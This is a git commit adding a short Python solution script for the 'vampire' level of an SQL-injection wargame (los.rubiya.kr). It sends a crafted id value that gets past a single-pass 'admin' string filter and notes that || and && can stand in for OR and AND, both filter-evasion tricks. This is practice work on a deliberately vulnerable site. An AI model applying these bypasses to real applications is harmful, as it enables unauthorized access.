f4f08133d2246c57f0effeca30c1b2c707f57712
yoobi <thisisyoobi@gmail.com>
2024-01-11 22:46:16 +0900

    vampire clear

---
+++ LOS/09_vampire/ex.py
@@ -0,0 +1,23 @@
+#!/usr/bin/env python3
+
+'''
+# Summary
+- we can use ||, && instead of OR, AND
+'''
+
+
+import requests
+
+header = {"Cookie": "PHPSESSID=❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚❚;"}
+url = "https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php"
+
+payload = "?id=admiadminn"
+
+response = requests.get(url + payload, headers=header)
+
+result = response.text
+if result.find("Clear!") != -1:
+    end = result.split("Clear!")[0].split("<h2>")[1]
+    if end.find("admin") != -1:
+        end = result.split("Clear!")[0].split("<h2>")[2]
+    print(end+"Clear!")
